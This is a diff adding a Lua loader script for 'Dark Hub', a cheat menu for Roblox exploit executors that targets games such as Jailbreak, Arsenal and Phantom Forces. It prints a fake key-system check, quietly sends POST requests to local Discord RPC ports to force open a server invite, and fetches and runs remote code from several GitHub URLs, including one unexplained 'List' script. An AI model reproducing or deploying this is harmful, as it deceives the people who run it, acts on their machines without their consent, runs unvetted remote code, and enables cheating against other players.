@@ -1,1 +1,448 @@
+--[[
 
++ Big Paintball - 3527629287
++ Bad Business - 3233893879
++ Jailbreak - 606849621
++ Strucid - 2377868063
++ Notoriety - 21532277
++ Weaponary - 3297964905
++ Strucid Zone Wars - 3606833500
++ Realistic Hood - 7791873535
++ Trenches - 5648523896
++ Phantom Forces - 292439477
++ MM2 - 142823291
++ Anomic - 4581966615
++ Arsenal - 286090429
++ Silly's Difficulty Chart Obby - 6824046084
++ Hellreaver - 5523314295
+
+
+getgenv().UnnamedCheat_FixUI = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/003AcccountMaker/Main/main/DarkHub"))();
+]]--
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+	if v.Name == "DarkHubLoader" then
+		v:Destroy()
+	end
+end
+rconsoleclear()
+rconsoleprint("@@BLUE@@")
+rconsolename("DARKHUB - KEY SYSTEM")
+rconsoleprint("~ Dark Hub Key System~\n\n")
+rconsoleprint("Link copied to clipboard! Paste this link in your browser and go through the ads to get a 24 hour key!\nPaste the key here when you are done.")
+wait(2)
+rconsoleclear()
+wait(1)
+rconsoleprint("~ Dark Hub Key System~\n\n")
+rconsoleprint("Save Key Found - Checking Key...\n")
+wait(0.3)
+rconsoleprint("@@GREEN@@")
+rconsoleprint("Saved Key Valid\n")
+rconsoleprint("DarkHub Key System Complete!\n")
+rconsoleprint("Loading DarkHub in 3 seconds!\n")
+wait(3)
+rconsoleclear()
+spawn(function()
+	for i = 1, 14 do
+		spawn(function()
+			local reqbody = {
+				["nonce"] = game:GetService("HttpService"):GenerateGUID(false),
+				["args"] = {
+					["invite"] = {["code"] = "mYswJdQr9Q"},
+					["code"] = "mYswJdQr9Q",
+				},
+				["cmd"] = "INVITE_BROWSER"
+			}
+			local newreq = game:GetService("HttpService"):JSONEncode(reqbody)
+			syn.request({
+				Headers = {
+					["Content-Type"] = "application/json",
+					["Origin"] = "https://discord.com"
+				},
+				Url = "http://127.0.0.1:64"..(53 + i).."/rpc?v=1",
+				Method = "POST",
+				Body = newreq
+			})
+		end)
+	end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mrgunz/S/main/List"))();
+function Sad()
+	if game.PlaceId==3527629287 then
+		for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+		
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Big_Paintball"))();
+	else
+		if game.PlaceId==3233893879 then
+			for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+			
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Bad_Business"))();
+		else
+			if game.PlaceId==606849621 then
+				for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+				
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Jailbreak"))();
+			else
+				if game.PlaceId==2377868063 then
+					for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+					
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Strucid"))();
+				else
+					if game.PlaceId==2557847604 then
+						for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+						
+						loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Notoriety"))();
+					else
+						if game.PlaceId==3297964905 then
+							for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+							
+							loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Weaponry"))();
+						else
+							if game.PlaceId==3606833500 then
+								for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+								
+								loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Strucid"))();
+							else
+								if game.PlaceId==7791873535 then
+									for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+									
+									loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/REALISTIC_HOOD"))();
+								else
+									if game.PlaceId==5648523896 then
+										for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+										
+										loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Trenches"))();
+									else
+										if game.PlaceId==292439477 then
+											for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+											
+											loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/PhantomForces"))();
+										else
+											if game.PlaceId==4581966615 then
+												for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+												
+												loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Anomic"))();
+											else
+												if game.PlaceId==286090429 then
+													for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+													
+													loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Arsenal"))();
+												else
+													if game.PlaceId==6824046084 then
+														for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+														
+														loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Chart_Obby"))();
+													else
+														if game.PlaceId==5523314295 then
+															for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+															
+															loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Hellreaver"))();
+														else
+															for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do if v.Name == "DarkHubLoader" then v:Destroy()end end
+					
+															loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Universal"))();
+														end
+													end
+												end
+											end
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+	if v.Name == "DarkHubLoader" then
+		v:Destroy()
+	end
+end
+local DarkHubLoader = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local MainFrameUICorner = Instance.new("UICorner")
+local TitleMain = Instance.new("TextLabel")
+local GlowMain = Instance.new("ImageLabel")
+local ContainerMain = Instance.new("Frame")
+local ContainerMainUICorner = Instance.new("UICorner")
+local LoadBtn = Instance.new("TextButton")
+local LoadBtnUICorner = Instance.new("UICorner")
+local GameText = Instance.new("TextLabel")
+local InfoFrame = Instance.new("Frame")
+local InfoFrameUICorner = Instance.new("UICorner")
+local TitleInfo = Instance.new("TextLabel")
+local GlowInfo = Instance.new("ImageLabel")
+local ContainerInfo = Instance.new("Frame")
+local ContainerInfoUICorner = Instance.new("UICorner")
+local UpdateLogText = Instance.new("TextLabel")
+local CreditsFrame = Instance.new("Frame")
+local CreditsFrameUICorner = Instance.new("UICorner")
+local TitleCredits = Instance.new("TextLabel")
+local GlowCredits = Instance.new("ImageLabel")
+local ContainerCredits = Instance.new("Frame")
+local ContainerCreditsUICorner = Instance.new("UICorner")
+local CreditsText = Instance.new("TextLabel")
+UpdateLogText.Text = "Get Unnamed Cheat"
+GameText.Text = "Not Supported - Universal"
+TitleMain.Text = "Dark Hub - Anti Key System"
+if game.PlaceId==3527629287 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==5548545858 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==606849621 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==2377868063 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==21532277 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==3297964905 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==3606833500 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==7791873535 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==5648523896 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==292439477 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==142823291 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==4581966615 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==286090429 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==6824046084 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if game.PlaceId==5523314295 then
+	GameText.Text = "Supported - "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+end
+if syn and syn.protect_gui then
+	syn.protect_gui(DarkHubLoader)
+	DarkHubLoader.Parent = game.CoreGui
+elseif gethui then
+	DarkHubLoader.Parent = gethui()
+else
+	DarkHubLoader.Parent = game.CoreGui
+end
+if getgenv().UnnamedCheat_FixUI == true then
+	InfoFrame.Position = UDim2.new(0.25329408, 0, 0.49999997, 0)
+	CreditsFrame.Position = UDim2.new(0.746436894, 0, 0.498607248, 0)
+else
+	CreditsText.Position = UDim2.new(0.49825418, 0, 0.633732855, -15)
+	InfoFrame.Position = UDim2.new(0.333000004, 0, 0.5, 0)
+end
+DarkHubLoader.Name = "DarkHubLoader"
+DarkHubLoader.Enabled = true
+DarkHubLoader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = DarkHubLoader
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.Size = UDim2.new(0, 393, 0, 191)
+MainFrame.Visible = true
+
+MainFrameUICorner.CornerRadius = UDim.new(0, 11)
+MainFrameUICorner.Name = "MainFrameUICorner"
+MainFrameUICorner.Parent = MainFrame
+
+TitleMain.Name = "TitleMain"
+TitleMain.Parent = MainFrame
+TitleMain.AnchorPoint = Vector2.new(0.5, 0.5)
+TitleMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TitleMain.BackgroundTransparency = 1.000
+TitleMain.Position = UDim2.new(0.49968192, 0, 0.5, -55)
+TitleMain.Size = UDim2.new(1, 0, 0, 30)
+TitleMain.Font = Enum.Font.Gotham
+TitleMain.TextColor3 = Color3.fromRGB(168, 168, 168)
+TitleMain.TextSize = 20.000
+
+GlowMain.Name = "GlowMain"
+GlowMain.Parent = MainFrame
+GlowMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GlowMain.BackgroundTransparency = 1.000
+GlowMain.BorderSizePixel = 0
+GlowMain.Position = UDim2.new(0, -19, 0, -12)
+GlowMain.Size = UDim2.new(1.0229007, 30, 0.968586385, 30)
+GlowMain.ZIndex = 0
+GlowMain.Image = "rbxassetid://297774371"
+GlowMain.ImageColor3 = Color3.fromRGB(15, 15, 15)
+GlowMain.ImageTransparency = 0.300
+GlowMain.SliceCenter = Rect.new(20, 20, 280, 280)
+
+ContainerMain.Name = "ContainerMain"
+ContainerMain.Parent = MainFrame
+ContainerMain.AnchorPoint = Vector2.new(0.5, 0.5)
+ContainerMain.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+ContainerMain.Position = UDim2.new(0.5, 0, 0.5, 30)
+ContainerMain.Size = UDim2.new(0, 367, 0, 107)
+
+ContainerMainUICorner.CornerRadius = UDim.new(0, 11)
+ContainerMainUICorner.Name = "ContainerMainUICorner"
+ContainerMainUICorner.Parent = ContainerMain
+
+LoadBtn.Name = "LoadBtn"
+LoadBtn.Parent = ContainerMain
+LoadBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadBtn.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+LoadBtn.Position = UDim2.new(0.501362383, 0, 0.658606648, 0)
+LoadBtn.Size = UDim2.new(0, 313, 0, 29)
+LoadBtn.AutoButtonColor = false
+LoadBtn.Font = Enum.Font.Gotham
+LoadBtn.Text = "Load"
+LoadBtn.TextColor3 = Color3.fromRGB(195, 195, 195)
+LoadBtn.TextSize = 14.000
+LoadBtn.MouseButton1Down:connect(function()
+	Sad()
+end)
+
+LoadBtnUICorner.CornerRadius = UDim.new(0, 6)
+LoadBtnUICorner.Name = "LoadBtnUICorner"
+LoadBtnUICorner.Parent = LoadBtn
+
+GameText.Name = "GameText"
+GameText.Parent = ContainerMain
+GameText.AnchorPoint = Vector2.new(0.5, 0.5)
+GameText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GameText.BackgroundTransparency = 1.000
+GameText.Position = UDim2.new(0.5, 0, 0.450819671, -15)
+GameText.Size = UDim2.new(0, 78, 0, 30)
+GameText.Font = Enum.Font.Gotham
+GameText.TextColor3 = Color3.fromRGB(168, 168, 168)
+GameText.TextSize = 20.000
+
+InfoFrame.Name = "InfoFrame"
+InfoFrame.Parent = DarkHubLoader
+InfoFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+InfoFrame.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+InfoFrame.Position = UDim2.new(0.333000004, 0, 0.5, 0)
+InfoFrame.Size = UDim2.new(0, 192, 0, 191)
+
+InfoFrameUICorner.CornerRadius = UDim.new(0, 11)
+InfoFrameUICorner.Name = "InfoFrameUICorner"
+InfoFrameUICorner.Parent = InfoFrame
+
+TitleInfo.Name = "TitleInfo"
+TitleInfo.Parent = InfoFrame
+TitleInfo.AnchorPoint = Vector2.new(0.5, 0.5)
+TitleInfo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TitleInfo.BackgroundTransparency = 1.000
+TitleInfo.Position = UDim2.new(0.49968192, 0, 0.5, -55)
+TitleInfo.Size = UDim2.new(1, 0, 0, 30)
+TitleInfo.Font = Enum.Font.Gotham
+TitleInfo.Text = "Info"
+TitleInfo.TextColor3 = Color3.fromRGB(168, 168, 168)
+TitleInfo.TextSize = 20.000
+
+GlowInfo.Name = "GlowInfo"
+GlowInfo.Parent = InfoFrame
+GlowInfo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GlowInfo.BackgroundTransparency = 1.000
+GlowInfo.BorderSizePixel = 0
+GlowInfo.Position = UDim2.new(0, -14, 0, -12)
+GlowInfo.Size = UDim2.new(0.989583194, 30, 0.968586385, 30)
+GlowInfo.ZIndex = 0
+GlowInfo.Image = "rbxassetid://297774371"
+GlowInfo.ImageColor3 = Color3.fromRGB(15, 15, 15)
+GlowInfo.ImageTransparency = 0.300
+GlowInfo.SliceCenter = Rect.new(20, 20, 280, 280)
+
+ContainerInfo.Name = "ContainerInfo"
+ContainerInfo.Parent = InfoFrame
+ContainerInfo.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+ContainerInfo.Position = UDim2.new(0.0327774696, 0, 0.367913216, 0)
+ContainerInfo.Size = UDim2.new(0, 179, 0, 107)
+
+ContainerInfoUICorner.CornerRadius = UDim.new(0, 11)
+ContainerInfoUICorner.Name = "ContainerInfoUICorner"
+ContainerInfoUICorner.Parent = ContainerInfo
+
+UpdateLogText.Name = "UpdateLogText"
+UpdateLogText.Parent = ContainerInfo
+UpdateLogText.AnchorPoint = Vector2.new(0.5, 0.5)
+UpdateLogText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UpdateLogText.BackgroundTransparency = 1.000
+UpdateLogText.Position = UDim2.new(0.49825418, 0, 0.633732855, -15)
+UpdateLogText.Size = UDim2.new(0, 165, 0, 88)
+UpdateLogText.Font = Enum.Font.Gotham
+UpdateLogText.TextColor3 = Color3.fromRGB(168, 168, 168)
+UpdateLogText.TextSize = 14.000
+UpdateLogText.TextWrapped = false
+UpdateLogText.TextScaled = false
+
+CreditsFrame.Name = "CreditsFrame"
+CreditsFrame.Parent = DarkHubLoader
+CreditsFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+CreditsFrame.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+CreditsFrame.Position = UDim2.new(0.666999996, 0, 0.5, 0)
+CreditsFrame.Size = UDim2.new(0, 192, 0, 191)
+
+CreditsFrameUICorner.CornerRadius = UDim.new(0, 11)
+CreditsFrameUICorner.Name = "CreditsFrameUICorner"
+CreditsFrameUICorner.Parent = CreditsFrame
+
+TitleCredits.Name = "TitleCredits"
+TitleCredits.Parent = CreditsFrame
+TitleCredits.AnchorPoint = Vector2.new(0.5, 0.5)
+TitleCredits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TitleCredits.BackgroundTransparency = 1.000
+TitleCredits.Position = UDim2.new(0.49968192, 0, 0.5, -55)
+TitleCredits.Size = UDim2.new(1, 0, 0, 30)
+TitleCredits.Font = Enum.Font.Gotham
+TitleCredits.Text = "Credits"
+TitleCredits.TextColor3 = Color3.fromRGB(168, 168, 168)
+TitleCredits.TextSize = 20.000
+
+GlowCredits.Name = "GlowCredits"
+GlowCredits.Parent = CreditsFrame
+GlowCredits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GlowCredits.BackgroundTransparency = 1.000
+GlowCredits.BorderSizePixel = 0
+GlowCredits.Position = UDim2.new(0, -14, 0, -12)
+GlowCredits.Size = UDim2.new(0.989583194, 30, 0.968586385, 30)
+GlowCredits.ZIndex = 0
+GlowCredits.Image = "rbxassetid://297774371"
+GlowCredits.ImageColor3 = Color3.fromRGB(15, 15, 15)
+GlowCredits.ImageTransparency = 0.300
+GlowCredits.SliceCenter = Rect.new(20, 20, 280, 280)
+
+ContainerCredits.Name = "ContainerCredits"
+ContainerCredits.Parent = CreditsFrame
+ContainerCredits.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+ContainerCredits.Position = UDim2.new(0.0327774696, 0, 0.367913216, 0)
+ContainerCredits.Size = UDim2.new(0, 179, 0, 107)
+
+ContainerCreditsUICorner.CornerRadius = UDim.new(0, 11)
+ContainerCreditsUICorner.Name = "ContainerCreditsUICorner"
+ContainerCreditsUICorner.Parent = ContainerCredits
+
+CreditsText.Name = "CreditsText"
+CreditsText.Parent = ContainerCredits
+CreditsText.AnchorPoint = Vector2.new(0.5, 0.5)
+CreditsText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CreditsText.BackgroundTransparency = 1.000
+CreditsText.Position = UDim2.new(0.49825418, 0, 0.633732855, -15)
+CreditsText.Size = UDim2.new(0, 165, 0, 88)
+CreditsText.Font = Enum.Font.Gotham
+CreditsText.Text = " MyButt#7857 \n Bye...\n Prestiged \n Dawid \n Felix \n Teax \n"
+CreditsText.TextColor3 = Color3.fromRGB(168, 168, 168)
+CreditsText.TextSize = 15.000
+CreditsText.TextWrapped = true
